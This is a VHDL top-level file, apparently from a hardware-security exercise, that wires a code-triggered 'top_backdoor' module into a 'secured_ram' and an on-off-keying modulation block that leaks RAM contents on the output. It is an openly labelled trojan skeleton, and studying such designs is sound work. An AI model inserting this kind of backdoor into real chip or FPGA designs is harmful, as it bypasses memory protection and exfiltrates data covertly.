----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date: 26.04.2022 11:37:46
-- Design Name: 
-- Module Name: top_level - Behavioral
-- Project Name: 
-- Target Devices: 
-- Tool Versions: 
-- Description: 
-- 
-- Dependencies: 
-- 
-- Revision:
-- Revision 0.01 - File Created
-- Additional Comments:
-- 
----------------------------------------------------------------------------------


library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

-- Uncomment the following library declaration if using
-- arithmetic functions with Signed or Unsigned values
--use IEEE.NUMERIC_STD.ALL;

-- Uncomment the following library declaration if instantiating
-- any Xilinx leaf cells in this code.
--library UNISIM;
--use UNISIM.VComponents.all;

entity top_level is
    Port ( clk : in STD_LOGIC;
           we : in STD_LOGIC;
           rst : in STD_LOGIC;
           adrs : in STD_LOGIC_VECTOR (5 downto 0);
           unlock_w_in : in STD_LOGIC;
           unlock_rw_in : in STD_LOGIC;
           data_in : in STD_LOGIC_VECTOR (15 downto 0);
           data_out : out STD_LOGIC;
           code : in STD_LOGIC_VECTOR (2 downto 0));
end top_level;

architecture Behavioral of top_level is

component top_backdoor is
    Port ( clk : in STD_LOGIC;
           rst : in STD_LOGIC;
           data_in : in STD_LOGIC_VECTOR (2 downto 0);
           output : out STD_LOGIC);
end component top_backdoor;

component secured_ram is
     port (
        clk : in std_logic;
        backdoor_activ : in std_logic;
        we : in std_logic;
        addr : in std_logic_vector(5 downto 0);
        datain : in std_logic_vector(15 downto 0);
        dataout : out std_logic_vector(15 downto 0);
        unlock_w_in : in std_logic;
        unlock_rw_in : in std_logic
    );
end component secured_ram;

-- bloc de modulation
component  top_conv is
    Port ( clk : in STD_LOGIC;
           rst : in STD_LOGIC;
           data_in : in STD_LOGIC_VECTOR (15 downto 0);
           data_out : out STD_LOGIC;
           activation : in STD_LOGIC);
end component top_conv;

-- signal declaration
signal s_ook : std_logic;
signal out_ram : std_logic_vector( 15 downto 0);
begin

back_door : top_backdoor port map (
            clk     => clk,
            rst     => rst,
            data_in => code,
            output  => s_ook);

secu_ram : secured_ram port map (
            clk             => clk,
            backdoor_activ  => s_ook,
            we              => we, 
            addr            => adrs,
            datain          => data_in,
            dataout         => out_ram,
            unlock_w_in     => unlock_w_in,
            unlock_rw_in    => unlock_rw_in ); 

modulation : top_conv port map(
            clk         => clk,
            rst         => rst,
            data_in     => out_ram,
            data_out    => data_out,
            activation  => s_ook);
                                
end Behavioral;
